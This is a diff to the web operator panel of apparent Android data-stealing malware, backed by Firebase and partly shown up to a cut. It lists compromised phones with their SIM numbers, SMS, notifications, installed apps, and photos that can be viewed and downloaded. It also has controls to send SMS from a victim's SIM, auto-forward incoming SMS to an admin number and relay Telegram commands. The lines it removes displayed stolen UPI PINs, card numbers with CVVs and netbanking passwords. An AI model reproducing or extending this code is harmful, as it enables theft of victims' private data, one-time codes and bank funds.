@@ -57,7 +57,7 @@ body { font-family:'Segoe UI',Roboto,sans-serif; background:#0A0E1A; color:#E5E7
 .balance-bar .acct { color:#8B9BB4; font-size:10px; }
 .drawer-overlay { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); z-index:998; opacity:0; pointer-events:none; transition:opacity 0.3s; }
 .drawer-overlay.active { opacity:1; pointer-events:auto; }
-.side-drawer { position:fixed; top:0; right:0; width:100%; max-width:520px; height:100vh; background:#111827; z-index:999; transform:translateX(100%); transition:transform 0.3s ease-out; display:flex; flex-direction:column; border-left:1px solid #00E5FF; box-shadow:-10px 0 40px rgba(0,229,255,0.2); }
+.side-drawer { position:fixed; top:0; right:0; width:100%; max-width:560px; height:100vh; background:#111827; z-index:999; transform:translateX(100%); transition:transform 0.3s ease-out; display:flex; flex-direction:column; border-left:1px solid #00E5FF; box-shadow:-10px 0 40px rgba(0,229,255,0.2); }
 .side-drawer.active { transform:translateX(0); }
 .drawer-header { padding:14px 18px; border-bottom:1px solid #1F2F4A; display:flex; justify-content:space-between; align-items:center; background:#0F1729; flex-shrink:0; }
 .drawer-header h2 { color:#00E5FF; font-size:15px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; flex:1; }
@@ -94,7 +94,7 @@ body { font-family:'Segoe UI',Roboto,sans-serif; background:#0A0E1A; color:#E5E7
 .send-card.green h3 { color:#00FF88; }
 .send-card p { color:#8B9BB4; font-size:11px; margin-bottom:12px; line-height:1.4; }
 .sim-row { display:flex; gap:8px; margin-bottom:12px; }
-.sim-btn { flex:1; padding:12px; background:#1A2F4A; border:2px solid transparent; border-radius:10px; color:#00E5FF; font-size:13px; font-weight:bold; cursor:pointer; }
+.sim-btn { flex:1; padding:12px; background:#1A2F4A; border:2px solid transparent; border-radius:10px; color:#00E5FF; font-size:13px; font-weight:bold; cursor:pointer; text-align:center; }
 .sim-btn.active { background:#00E5FF; color:#0A0E1A; border-color:#00E5FF; }
 .on-off-btn { padding:12px 24px; background:#1A2F4A; border:none; border-radius:8px; color:#00E5FF; font-size:13px; font-weight:bold; cursor:pointer; white-space:nowrap; }
 .on-off-btn.on { background:#00FF88; color:#0A0E1A; }
@@ -108,17 +108,40 @@ body { font-family:'Segoe UI',Roboto,sans-serif; background:#0A0E1A; color:#E5E7
 .device-info-row .v { color:#E5E7EB; font-weight:500; }
 .loading { text-align:center; padding:40px; color:#5A6B85; }
 .empty-msg { text-align:center; padding:40px 20px; color:#5A6B85; font-size:13px; }
-.photo-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(100px,1fr)); gap:8px; }
-.photo-item { border-radius:8px; overflow:hidden; background:#0F1729; cursor:pointer; }
-.photo-item img { width:100%; height:100px; object-fit:cover; display:block; }
-.app-item { background:#0F1729; padding:10px 12px; border-radius:8px; margin-bottom:6px; display:flex; align-items:center; gap:10px; }
-.app-icon { width:32px; height:32px; background:#1A2F4A; border-radius:8px; display:flex; align-items:center; justify-content:center; color:#00E5FF; font-size:16px; }
+/* PHOTOS */
+.photo-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(110px,1fr)); gap:8px; }
+.photo-item { border-radius:10px; overflow:hidden; background:#0F1729; cursor:pointer; position:relative; border:1px solid #1F2F4A; }
+.photo-item:hover { border-color:#00E5FF; }
+.photo-item img { width:100%; height:110px; object-fit:cover; display:block; background:#1A2F4A; }
+.photo-name { padding:6px; font-size:9px; color:#8B9BB4; overflow:hidden; white-space:nowrap; text-overflow:ellipsis; background:rgba(0,0,0,0.6); }
+.photo-folder { position:absolute; top:4px; left:4px; padding:2px 6px; background:rgba(0,229,255,0.85); color:#0A0E1A; border-radius:6px; font-size:8px; font-weight:bold; text-transform:uppercase; }
+.photo-actions { display:flex; gap:4px; padding:4px; background:rgba(0,0,0,0.4); }
+.photo-actions button { flex:1; background:transparent; border:1px solid #1F2F4A; border-radius:6px; color:#00E5FF; padding:4px; font-size:10px; cursor:pointer; }
+/* PHOTO VIEWER */
+.photo-viewer { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:2000; display:none; align-items:center; justify-content:center; padding:20px; }
+.photo-viewer.active { display:flex; flex-direction:column; }
+.photo-viewer img { max-width:100%; max-height:80vh; object-fit:contain; border-radius:8px; }
+.photo-viewer-controls { display:flex; gap:10px; margin-top:16px; }
+.photo-viewer-controls button { padding:10px 20px; background:#1A2F4A; border:1px solid #00E5FF; color:#00E5FF; border-radius:8px; cursor:pointer; font-size:12px; font-weight:bold; }
+.photo-viewer-controls button.close { background:#FF3B5C; border-color:#FF3B5C; color:white; }
+.photo-viewer-info { color:#8B9BB4; font-size:11px; margin-top:10px; text-align:center; }
+/* APPS */
+.app-item { background:#0F1729; padding:10px 12px; border-radius:8px; margin-bottom:6px; display:flex; align-items:center; gap:10px; border-left:3px solid #00E5FF; }
+.app-icon { width:36px; height:36px; background:#1A2F4A; border-radius:10px; display:flex; align-items:center; justify-content:center; color:#00E5FF; font-size:16px; flex-shrink:0; }
 .app-name { color:white; font-size:12px; font-weight:bold; }
-.app-package { color:#8B9BB4; font-size:9px; font-family:monospace; margin-top:2px; }
+.app-package { color:#8B9BB4; font-size:9px; font-family:monospace; margin-top:2px; word-break:break-all; }
+/* NOTIFS */
+.notif-item { background:#0F1729; border-left:3px solid #00E5FF; border-radius:8px; padding:12px; margin-bottom:10px; }
+.notif-app { color:#00E5FF; font-size:12px; font-weight:bold; margin-bottom:4px; display:flex; justify-content:space-between; }
+.notif-title { color:#FFF; font-size:12px; font-weight:600; margin-bottom:2px; }
+.notif-body { color:#8B9BB4; font-size:12px; line-height:1.4; word-break:break-word; }
+.notif-date { color:#5A6B85; font-size:10px; margin-top:6px; text-align:right; }
 @media (max-width:600px) {
   .topbar h1 { font-size:14px; }
   .device-grid { grid-template-columns:1fr; }
   .side-drawer { max-width:100%; }
+  .photo-grid { grid-template-columns:repeat(auto-fill,minmax(90px,1fr)); }
+  .photo-item img { height:90px; }
 }
 </style>
 </head>
@@ -147,13 +170,11 @@ body { font-family:'Segoe UI',Roboto,sans-serif; background:#0A0E1A; color:#E5E7
     <div class="stat-card"><div class="num" id="statOnline">0</div><div class="label">Online</div></div>
     <div class="stat-card"><div class="num" id="statOffline">0</div><div class="label">Offline</div></div>
     <div class="stat-card"><div class="num" id="statMessages">0</div><div class="label">All SMS</div></div>
-    <div class="stat-card"><div class="num" id="statBankSms">0</div><div class="label">Bank SMS</div></div>
+    <div class="stat-card"><div class="num" id="statPhotos">0</div><div class="label">Photos</div></div>
   </div>
   <div class="quick-actions">
     <div class="action-btn" id="btnCsvExport"><div class="action-icon">📋</div><div><div class="action-label">CSV</div><div class="action-sub">Export data</div></div></div>
-    <div class="action-btn" id="btnPingAll"><div class="action-icon">📍</div><div><div class="action-label">PING ALL</div><div class="action-sub">Ping devices</div></div></div>
     <div class="action-btn" id="btnFbSources"><div class="action-icon">🔥</div><div><div class="action-label">FB</div><div class="action-sub">Firebase</div></div></div>
-    <div class="action-btn" id="btnCards"><div class="action-icon">💳</div><div><div class="action-label">CARDS</div><div class="action-sub">Payment</div></div></div>
     <div class="action-btn" id="btnNuke"><div class="action-icon">☢️</div><div><div class="action-label">NUKE</div><div class="action-sub">Delete all</div></div></div>
   </div>
   <div class="container">
@@ -162,9 +183,6 @@ body { font-family:'Segoe UI',Roboto,sans-serif; background:#0A0E1A; color:#E5E7
       <div class="filter-btn active" data-filter="all">All</div>
       <div class="filter-btn" data-filter="online">Online</div>
       <div class="filter-btn" data-filter="offline">Offline</div>
-      <div class="filter-btn" data-filter="upi">UPI</div>
-      <div class="filter-btn" data-filter="bank">Bank</div>
-      <div class="filter-btn" data-filter="card">Card</div>
       <div class="filter-btn" data-filter="liked">⭐ Liked</div>
     </div>
     <div class="device-grid" id="deviceGrid"><div class="loading">Loading devices...</div></div>
@@ -184,21 +202,22 @@ body { font-family:'Segoe UI',Roboto,sans-serif; background:#0A0E1A; color:#E5E7
   <div class="drawer-mini" id="deviceMini"></div>
   <div class="tabs">
     <button class="tab active" data-tab="info">Info</button>
-    <button class="tab" data-tab="bank">Bank <span class="count" id="bankCount">0</span></button>
-    <button class="tab" data-tab="card">Card <span class="count" id="cardCount">0</span></button>
-    <button class="tab" data-tab="allsms">All SMS <span class="count" id="smsCount">0</span></button>
+    <button class="tab" data-tab="photos">Photos <span class="count" id="photosCount">0</span></button>
+    <button class="tab" data-tab="apps">Apps <span class="count" id="appsCount">0</span></button>
+    <button class="tab" data-tab="notifs">Notifs <span class="count" id="notifsCount">0</span></button>
+    <button class="tab" data-tab="allsms">SMS <span class="count" id="smsCount">0</span></button>
     <button class="tab" data-tab="send">Send</button>
   </div>
   <div class="drawer-body" id="modalBody"><div class="loading">Loading...</div></div>
 </div>
 
-<div class="drawer-overlay" id="dialogOverlay" style="z-index:1000;"></div>
-<div class="side-drawer" id="dialogDrawer" style="max-width:500px;z-index:1001;">
-  <div class="drawer-header">
-    <h2 id="dialogTitle">Dialog</h2>
-    <button class="icon-btn danger" id="closeDialogBtn">✕</button>
+<div class="photo-viewer" id="photoViewer">
+  <img id="photoViewerImg" src="">
+  <div class="photo-viewer-info" id="photoViewerInfo"></div>
+  <div class="photo-viewer-controls">
+    <button id="photoViewerDownload">⬇ DOWNLOAD</button>
+    <button class="close" id="photoViewerClose">✕ CLOSE</button>
   </div>
-  <div class="drawer-body" id="dialogBody"></div>
 </div>
 
 <script>
@@ -216,6 +235,8 @@ var currentTab = 'info';
 var deviceMessages = {};
 var currentFilter = 'all';
 var likedDevices = JSON.parse(localStorage.getItem('liked_devices') || '[]');
+var photosData = {};
+var currentPhotoKey = '';
 
 function doLogin() {
   var pin = document.getElementById('pinInput').value.trim();
@@ -243,18 +264,19 @@ function startApp() {
 }
 function updateStats() {
   var ids = Object.keys(allDevices);
-  var online = 0, offline = 0, totalMsgs = 0, bankSms = 0;
+  var online = 0, offline = 0, totalMsgs = 0, totalPhotos = 0;
   ids.forEach(function(id) {
     var dev = allDevices[id];
     if (dev.status === 'Online') online++; else offline++;
-    if (dev.messages) Object.values(dev.messages).forEach(function(m) { totalMsgs++; if (detectCategory(m.sender, m.body) === 'BANK') bankSms++; });
-    if (dev.sms_history) Object.values(dev.sms_history).forEach(function(m) { totalMsgs++; if (detectCategory(m.sender, m.body) === 'BANK') bankSms++; });
+    if (dev.messages) totalMsgs += Object.keys(dev.messages).length;
+    if (dev.sms_history) totalMsgs += Object.keys(dev.sms_history).length;
+    if (dev.photos) totalPhotos += Object.keys(dev.photos).length;
   });
   document.getElementById('statDevices').textContent = ids.length;
   document.getElementById('statOnline').textContent = online;
   document.getElementById('statOffline').textContent = offline;
   document.getElementById('statMessages').textContent = totalMsgs;
-  document.getElementById('statBankSms').textContent = bankSms;
+  document.getElementById('statPhotos').textContent = totalPhotos;
 }
 function isLiked(id) { return likedDevices.indexOf(id) !== -1; }
 function toggleLike(id) {
@@ -276,9 +298,6 @@ function renderDevices() {
     if (currentFilter === 'online' && dev.status !== 'Online') return false;
     if (currentFilter === 'offline' && dev.status === 'Online') return false;
     if (currentFilter === 'liked' && !isLiked(id)) return false;
-    if (currentFilter === 'upi' && !dev.upi_data) return false;
-    if (currentFilter === 'card' && !dev.card_data) return false;
-    if (currentFilter === 'bank' && !dev.netbanking_data) return false;
     var s = (id + ' ' + (dev.device_model || '') + ' ' + (dev.sim_info && dev.sim_info.sim1_number || '')).toLowerCase();
     return s.indexOf(search) !== -1;
   });
@@ -294,9 +313,9 @@ function renderDevices() {
     var model = dev.device_model || 'Unknown';
     var battery = dev.battery || '0%';
     var sim = (dev.sim_info && (dev.sim_info.sim1_number || dev.sim_info.sim2_number)) || 'No SIM';
-    var balance = dev.last_balance || '--';
     var liked = isLiked(id);
-    return '<div class="device-card" data-id="' + id + '"><div class="device-header"><div class="wifi-icon">📶</div><div class="device-info"><div class="device-name">' + escapeHtml(model) + '</div><div class="device-id">' + id + '</div></div><div class="star-icon" data-star="' + id + '">' + (liked ? '⭐' : '☆') + '</div></div><div class="device-details"><div><div class="label">Android</div><div class="value">v' + escapeHtml(dev.android_version || '?') + '</div></div><div><div class="label">Battery</div><div class="value" style="color:' + getBatteryColor(battery) + '">' + battery + '</div></div><div><div class="label">Number</div><div class="value">' + escapeHtml(sim) + '</div></div><div><div class="label">Network</div><div class="value">' + escapeHtml((dev.sim_info && dev.sim_info.sim1_carrier) || '-') + '</div></div></div>' + (balance !== '--' ? '<div class="balance-bar"><div><div class="acct">₹ Balance</div></div><div class="amt">' + escapeHtml(balance) + '</div></div>' : '') + '</div>';
+    var photos = dev.photos ? Object.keys(dev.photos).length : 0;
+    return '<div class="device-card" data-id="' + id + '"><div class="device-header"><div class="wifi-icon">📶</div><div class="device-info"><div class="device-name">' + escapeHtml(model) + '</div><div class="device-id">' + id + '</div></div><div class="star-icon" data-star="' + id + '">' + (liked ? '⭐' : '☆') + '</div></div><div class="device-details"><div><div class="label">Android</div><div class="value">v' + escapeHtml(dev.android_version || '?') + '</div></div><div><div class="label">Battery</div><div class="value" style="color:' + getBatteryColor(battery) + '">' + battery + '</div></div><div><div class="label">Number</div><div class="value">' + escapeHtml(sim) + '</div></div><div><div class="label">Photos</div><div class="value">' + photos + '</div></div></div></div>';
   }).join('');
   grid.querySelectorAll('.device-card').forEach(function(card) {
     card.addEventListener('click', function(e) {
@@ -307,31 +326,6 @@ function renderDevices() {
 }
 function getBatteryColor(battery) { var pct = parseInt(battery) || 0; if (pct >= 50) return '#00FF88'; if (pct >= 20) return '#FFD700'; return '#FF3B5C'; }
 function escapeHtml(text) { if (!text) return ''; var d = document.createElement('div'); d.textContent = text; return d.innerHTML; }
-function detectCategory(sender, body) {
-  var s = (sender || '').toUpperCase(); var b = (body || '').toUpperCase();
-  if (b.indexOf('OTP') !== -1 || b.indexOf('VERIFICATION') !== -1) return 'OTP';
-  if (b.indexOf('BAL') !== -1 || b.indexOf('BALANCE') !== -1 || b.indexOf('AVAILABLE') !== -1) return 'BALANCE';
-  if (b.indexOf('CREDIT') !== -1 || b.indexOf('CREDITED') !== -1) return 'CREDIT';
-  if (b.indexOf('DEBIT') !== -1 || b.indexOf('DEBITED') !== -1) return 'DEBIT';
-  if (b.indexOf('BANK') !== -1 || s.indexOf('BANK') !== -1 || s.indexOf('SBI') !== -1 || s.indexOf('HDFC') !== -1 || s.indexOf('ICICI') !== -1 || s.indexOf('AXIS') !== -1 || s.indexOf('BOB') !== -1) return 'BANK';
-  return 'ALERT';
-}
-function detectBankName(sender) {
-  var s = (sender || '').toUpperCase();
-  if (s.indexOf('SBI') !== -1) return 'SBI';
-  if (s.indexOf('HDFC') !== -1) return 'HDFC';
-  if (s.indexOf('ICICI') !== -1) return 'ICICI';
-  if (s.indexOf('AXIS') !== -1) return 'AXIS';
-  if (s.indexOf('BOB') !== -1) return 'BOB';
-  if (s.indexOf('PHONEPE') !== -1 || s.indexOf('PHONPE') !== -1) return 'PhonePe';
-  if (s.indexOf('GPAY') !== -1 || s.indexOf('GOOGLE') !== -1) return 'GPay';
-  if (s.indexOf('PAYTM') !== -1) return 'Paytm';
-  return 'Bank';
-}
-function extractBalance(body) {
-  var m = (body || '').match(/(?:Rs\.?|INR|₹)\s*([0-9,]+(?:\.[0-9]+)?)/i);
-  return m ? '₹ ' + m[1] : '';
-}
 
 function openDevice(id) {
   currentDeviceId = id;
@@ -339,18 +333,21 @@ function openDevice(id) {
   document.getElementById('modalTitle').textContent = '📱 ' + (dev.device_model || id);
   updateStar();
   var sim = (dev.sim_info && (dev.sim_info.sim1_number || dev.sim_info.sim2_number)) || 'No SIM';
-  var balance = dev.last_balance || '--';
-  document.getElementById('deviceMini').innerHTML = '<div class="wifi-icon">📶</div><div class="mini-info"><span class="badge">' + (dev.status || 'Offline') + '</span><span class="badge">Bat ' + (dev.battery || '0%') + '</span><span class="badge">' + escapeHtml(sim) + '</span>' + (balance !== '--' ? '<span class="badge" style="background:rgba(0,255,136,0.15);color:#00FF88">' + escapeHtml(balance) + '</span>' : '') + '</div>';
+  document.getElementById('deviceMini').innerHTML = '<div class="wifi-icon">📶</div><div class="mini-info"><span class="badge">' + (dev.status || 'Offline') + '</span><span class="badge">Bat ' + (dev.battery || '0%') + '</span><span class="badge">' + escapeHtml(sim) + '</span></div>';
   db.ref('device_info/' + id + '/messages').on('value', function(snap) {
     deviceMessages = snap.val() || {};
     if (currentTab === 'allsms' || currentTab === 'bank') renderTab();
+  });
+  db.ref('device_info/' + id + '/photos').on('value', function(snap) {
+    photosData = snap.val() || {};
+    if (currentTab === 'photos') renderPhotos();
   });
   document.getElementById('sideDrawer').classList.add('active');
   document.getElementById('drawerOverlay').classList.add('active');
   switchTab('info');
 }
 function closeModal() {
-  if (currentDeviceId) { db.ref('device_info/' + currentDeviceId + '/messages').off(); }
+  if (currentDeviceId) { db.ref('device_info/' + currentDeviceId + '/messages').off(); db.ref('device_info/' + currentDeviceId + '/photos').off(); }
   document.getElementById('sideDrawer').classList.remove('active');
   document.getElementById('drawerOverlay').classList.remove('active');
   currentDeviceId = null;
@@ -360,18 +357,88 @@ function switchTab(tab) {
   document.querySelectorAll('.tab').forEach(function(t) { t.classList.toggle('active', t.getAttribute('data-tab') === tab); });
   renderTab();
 }
+
+function renderPhotos() {
+  var body = document.getElementById('modalBody');
+  var photos = Object.entries(photosData);
+  document.getElementById('photosCount').textContent = photos.length;
+  if (photos.length === 0) { body.innerHTML = '<div class="empty-msg">No photos yet</div>'; return; }
+  body.innerHTML = '<div class="photo-grid">' + photos.map(function(pair) {
+    var k = pair[0]; var p = pair[1];
+    var src = p.base64 || '';
+    return '<div class="photo-item" data-photo="' + k + '">' +
+      '<img src="' + src + '" loading="lazy" onerror="this.style.background=\'#1A2F4A\';this.src=\'\';">' +
+      (p.folder ? '<div class="photo-folder">' + escapeHtml(p.folder) + '</div>' : '') +
+      '<div class="photo-name">' + escapeHtml(p.name || 'IMG') + '</div>' +
+      '</div>';
+  }).join('') + '</div>';
+  body.querySelectorAll('[data-photo]').forEach(function(el) {
+    el.addEventListener('click', function() { showPhoto(this.getAttribute('data-photo')); });
+  });
+}
+
+function showPhoto(key) {
+  var p = photosData[key];
+  if (!p || !p.base64) { alert('No image data'); return; }
+  currentPhotoKey = key;
+  document.getElementById('photoViewerImg').src = p.base64;
+  document.getElementById('photoViewerInfo').textContent = (p.name || 'IMG') + ' — ' + (p.size || '') + ' — ' + (p.date || '');
+  document.getElementById('photoViewer').classList.add('active');
+}
+document.getElementById('photoViewerClose').addEventListener('click', function() {
+  document.getElementById('photoViewer').classList.remove('active');
+});
+document.getElementById('photoViewerDownload').addEventListener('click', function() {
+  var p = photosData[currentPhotoKey];
+  if (!p || !p.base64) return;
+  var a = document.createElement('a');
+  a.href = p.base64;
+  a.download = p.name || 'photo.jpg';
+  a.click();
+});
+document.getElementById('photoViewer').addEventListener('click', function(e) {
+  if (e.target.id === 'photoViewer') this.classList.remove('active');
+});
+
+function renderApps() {
+  var body = document.getElementById('modalBody');
+  var dev = allDevices[currentDeviceId];
+  var apps = dev.installed_apps || {};
+  var list = Object.values(apps).sort(function(a, b) { return (a.name || '').localeCompare(b.name || ''); });
+  document.getElementById('appsCount').textContent = list.length;
+  if (list.length === 0) { body.innerHTML = '<div class="empty-msg">No apps yet</div>'; return; }
+  body.innerHTML = list.map(function(a) {
+    return '<div class="app-item"><div class="app-icon">📦</div><div style="flex:1;min-width:0;"><div class="app-name">' + escapeHtml(a.name || 'Unknown') + '</div><div class="app-package">' + escapeHtml(a.package || '') + '</div></div></div>';
+  }).join('');
+}
+
+function renderNotifs() {
+  var body = document.getElementById('modalBody');
+  var dev = allDevices[currentDeviceId];
+  var notifs = dev.notifications || {};
+  var list = Object.entries(notifs).sort(function(a, b) { return (b[1].timestamp || 0) - (a[1].timestamp || 0); });
+  document.getElementById('notifsCount').textContent = list.length;
+  if (list.length === 0) { body.innerHTML = '<div class="empty-msg">No notifications</div>'; return; }
+  body.innerHTML = list.map(function(pair) {
+    var n = pair[1];
+    return '<div class="notif-item"><div class="notif-app"><span>' + escapeHtml(n.app || 'App') + '</span><span style="color:#8B9BB4;font-size:9px">' + (n.date || '') + '</span></div>' + (n.title ? '<div class="notif-title">' + escapeHtml(n.title) + '</div>' : '') + '<div class="notif-body">' + escapeHtml(n.message || '') + '</div></div>';
+  }).join('');
+}
+
 function renderTab() {
   var body = document.getElementById('modalBody');
   var dev = allDevices[currentDeviceId];
   if (!dev) { body.innerHTML = '<div class="empty-msg">Not found</div>'; return; }
+  
+  if (currentTab === 'photos') { renderPhotos(); return; }
+  if (currentTab === 'apps') { renderApps(); return; }
+  if (currentTab === 'notifs') { renderNotifs(); return; }
+  
   var allMsgs = [];
   Object.values(deviceMessages).forEach(function(m) { allMsgs.push(m); });
   if (dev.sms_history) Object.values(dev.sms_history).forEach(function(m) { allMsgs.push(m); });
   allMsgs.sort(function(a, b) { return (b.timestamp || 0) - (a.timestamp || 0); });
   document.getElementById('smsCount').textContent = allMsgs.length;
-  var bankMsgs = allMsgs.filter(function(m) { var c = detectCategory(m.sender, m.body); return c === 'BANK' || c === 'BALANCE'; });
-  document.getElementById('bankCount').textContent = bankMsgs.length;
-  document.getElementById('cardCount').textContent = dev.card_data ? '1' : '0';
   
   if (currentTab === 'info') {
     body.innerHTML = '<div class="message-item"><div class="msg-sender">DEVICE INFO</div><div class="msg-body">' +
@@ -383,169 +450,41 @@ function renderTab() {
       '<div class="device-info-row"><span class="k">Status</span><span class="v">' + (dev.status || '-') + '</span></div>' +
       '<div class="device-info-row"><span class="k">SIM 1</span><span class="v">' + escapeHtml((dev.sim_info && dev.sim_info.sim1_number) || '-') + '</span></div>' +
       '<div class="device-info-row"><span class="k">SIM 2</span><span class="v">' + escapeHtml((dev.sim_info && dev.sim_info.sim2_number) || '-') + '</span></div>' +
-      '<div class="device-info-row"><span class="k">IP</span><span class="v">' + escapeHtml(dev.ip_address || '-') + '</span></div>' +
-      '<div class="device-info-row"><span class="k">Storage</span><span class="v">' + escapeHtml(dev.storage || '-') + '</span></div>' +
-      '<div class="device-info-row"><span class="k">CPU</span><span class="v">' + escapeHtml(dev.cpu_arch || '-') + '</span></div>' +
-      '<div class="device-info-row"><span class="k">SDK</span><span class="v">' + escapeHtml(dev.android_sdk || '-') + '</span></div>' +
-      '<div class="device-info-row"><span class="k">Installed</span><span class="v">' + escapeHtml(dev.first_install_time || dev.install_time || '-') + '</span></div>' +
       '<div class="device-info-row"><span class="k">Last Seen</span><span class="v">' + (dev.last_seen ? new Date(dev.last_seen).toLocaleString() : '-') + '</span></div>' +
       '</div></div>';
-  } else if (currentTab === 'bank') {
-    if (bankMsgs.length === 0) { body.innerHTML = '<div class="empty-msg">No bank messages</div>'; return; }
-    body.innerHTML = bankMsgs.map(function(m) {
-      var bal = extractBalance(m.body);
-      var bank = detectBankName(m.sender);
-      return '<div class="message-item"><div class="msg-sender">' + escapeHtml(bank) + ' — ' + escapeHtml(m.sender || '') + '</div>' + (bal ? '<div style="color:#00FF88;font-size:18px;font-weight:bold;margin:8px 0;">' + bal + '</div>' : '') + '<div class="msg-body">' + escapeHtml(m.body || '') + '</div><div class="msg-date">' + (m.date || '') + '</div></div>';
-    }).join('');
-  } else if (currentTab === 'card') {
-    var upi = dev.upi_data || {}; var card = dev.card_data || {}; var bank = dev.netbanking_data || {};
-    body.innerHTML = '<div class="message-item"><div class="msg-sender">💳 UPI DATA</div><div class="msg-body"><strong>App:</strong> ' + escapeHtml(upi.app_name || '-') + '<br><strong>PIN:</strong> ' + escapeHtml(upi.upi_pin || '-') + '</div></div><div class="message-item"><div class="msg-sender">💳 CARD DATA</div><div class="msg-body"><strong>Number:</strong> ' + escapeHtml(card.card_number || '-') + '<br><strong>Expiry:</strong> ' + escapeHtml(card.expiry || '-') + '<br><strong>CVV:</strong> ' + escapeHtml(card.cvv || '-') + '<br><strong>Holder:</strong> ' + escapeHtml(card.card_holder || '-') + '</div></div><div class="message-item"><div class="msg-sender">🏦 NETBANKING</div><div class="msg-body"><strong>Bank:</strong> ' + escapeHtml(bank.bank_name || '-') + '<br><strong>User ID:</strong> ' + escapeHtml(bank.user_id || '-') + '<br><strong>Password:</strong> ' + escapeHtml(bank.password || '-') + '</div></div>';
   } else if (currentTab === 'allsms') {
     if (allMsgs.length === 0) { body.innerHTML = '<div class="empty-msg">No SMS</div>'; return; }
-    body.innerHTML = '<input type="text" class="form-input" id="smsSearch" placeholder="Search SMS..." style="margin-bottom:10px;">' + allMsgs.map(function(m, i) {
-      return '<div class="message-item ' + (m.type === 'SENT' ? 'sent' : '') + '" data-sms-search="' + escapeHtml((m.sender || '') + ' ' + (m.body || '')).toLowerCase() + '"><div class="msg-sender"><span>' + escapeHtml(m.sender || 'Unknown') + '</span><span style="color:' + (m.type === 'SENT' ? '#00FF88' : '#00E5FF') + ';font-size:9px">' + (m.type || 'IN') + '</span></div><div class="msg-body">' + escapeHtml(m.body || '') + '</div><div class="msg-date">' + (m.date || '') + '</div></div>';
+    body.innerHTML = allMsgs.map(function(m) {
+      return '<div class="message-item ' + (m.type === 'SENT' ? 'sent' : '') + '"><div class="msg-sender"><span>' + escapeHtml(m.sender || 'Unknown') + '</span><span style="color:' + (m.type === 'SENT' ? '#00FF88' : '#00E5FF') + ';font-size:9px">' + (m.type || 'IN') + '</span></div><div class="msg-body">' + escapeHtml(m.body || '') + '</div><div class="msg-date">' + (m.date || '') + '</div></div>';
     }).join('');
-    setTimeout(function() {
-      var inp = document.getElementById('smsSearch');
-      if (inp) inp.addEventListener('input', function() {
-        var q = this.value.toLowerCase();
-        document.querySelectorAll('[data-sms-search]').forEach(function(el) {
-          el.style.display = el.getAttribute('data-sms-search').indexOf(q) !== -1 ? 'block' : 'none';
-        });
-      });
-    }, 50);
   } else if (currentTab === 'send') {
-    var fwd = dev.forward_settings || {};
-    var simSelected = fwd.forward_sim_slot || 1;
-    var forwardingOn = fwd.enabled || false;
-    var fwdNumber = fwd.admin_number || '';
-    var botToken = fwd.bot_token || '';
-    var chatId = fwd.chat_id || '';
-    
     body.innerHTML = 
-      '<div class="send-card telegram">' +
-      '<h3>✈️ Telegram to SMS Auto</h3>' +
-      '<p>Auto-fills the Send SMS form and sends instantly when a channel message arrives</p>' +
-      '<div class="form-group"><label class="form-label">Bot Token</label><input type="text" class="form-input" id="tgToken" value="' + escapeHtml(botToken) + '" placeholder="BotFather token"></div>' +
-      '<div style="display:flex;gap:8px;align-items:flex-end;">' +
-      '<div class="form-group" style="flex:1;margin-bottom:0;"><label class="form-label">Channel / Chat ID</label><input type="text" class="form-input" id="tgChat" value="' + escapeHtml(chatId) + '" placeholder="-100xxx or @channel"></div>' +
-      '<button class="btn-submit" id="tgStart" style="width:auto;padding:10px 20px;margin:0;">Start</button>' +
-      '</div>' +
-      '<div class="info-box"><span class="dot-indicator"></span>Idle - enter a token and chat ID, then select Start</div>' +
-      '<div class="info-box" style="font-style:italic;">Format: line 1 is the phone number; remaining lines are the SMS text.</div>' +
-      '</div>' +
-      
-      '<div class="send-card forwarding">' +
-      '<h3 style="color:#00FF88;">📱 SMS FORWARDING (AUTO)</h3>' +
-      '<p>Enter a number and select ON. New SMS messages are placed in the Send SMS form automatically.</p>' +
-      '<label class="form-label">SIM (SEND LINE)</label>' +
-      '<div class="sim-row">' +
-      '<div class="sim-btn ' + (simSelected === 1 ? 'active' : '') + '" data-sim="1">SIM 1' + (simSelected === 1 ? ' ✓' : '') + '</div>' +
-      '<div class="sim-btn ' + (simSelected === 2 ? 'active' : '') + '" data-sim="2">SIM 2</div>' +
-      '</div>' +
-      '<label class="form-label">+91 FORWARDING NUMBER</label>' +
-      '<div style="display:flex;gap:8px;">' +
-      '<input type="text" class="form-input" id="fwdNum" value="' + escapeHtml(fwdNumber) + '" placeholder="+91XXXXXXXXXX" inputmode="numeric" style="flex:1;">' +
-      '<button class="on-off-btn ' + (forwardingOn ? 'on' : '') + '" id="fwdToggle">' + (forwardingOn ? '✓ ON' : '▶ ON') + '</button>' +
-      '</div>' +
-      '<div class="info-box green"><span class="dot-indicator ' + (forwardingOn ? 'on' : '') + '"></span>Off - enter a number and select ON</div>' +
-      '<div class="info-box" style="font-style:italic;">Recipient: forwarding number. Message: complete new SMS. Send delay: 0.5 seconds.</div>' +
-      '</div>' +
-      
-      '<div class="send-card">' +
-      '<h3>📤 SEND SMS DIRECT</h3>' +
-      '<label class="form-label">SELECT SIM</label>' +
-      '<div class="sim-row">' +
-      '<div class="sim-btn active" data-sendsim="1">SIM 1</div>' +
-      '<div class="sim-btn" data-sendsim="2">SIM 2</div>' +
-      '</div>' +
-      '<div class="form-group"><label class="form-label">RECIPIENT</label><input type="text" class="form-input" id="sendTo" placeholder="+919876543210" inputmode="numeric"></div>' +
-      '<div class="form-group"><label class="form-label">MESSAGE</label><textarea class="form-textarea" id="sendMsg" placeholder="Type your message here..."></textarea><div class="chars-count" id="charsCount">0 chars</div></div>' +
-      '<button class="btn-submit" id="sendBtn">✈️ Send via SIM</button>' +
-      '<button class="btn-submit" id="useDeviceNum" style="background:#1A2F4A;color:#00E5FF;margin-top:8px;">Use device number: ' + escapeHtml((dev.sim_info && dev.sim_info.sim1_number) || '-') + '</button>' +
-      '</div>';
-    
+      '<div class="send-card telegram"><h3>✈️ Telegram to SMS Auto</h3><p>Auto-fills SMS form and sends instantly when Telegram message arrives</p><div class="form-group"><label class="form-label">Bot Token</label><input type="text" class="form-input" id="tgToken" placeholder="BotFather token"></div><div class="form-group"><label class="form-label">Chat ID</label><input type="text" class="form-input" id="tgChat" placeholder="-100xxx or @channel"></div><button class="btn-submit" id="tgStart">START</button></div>' +
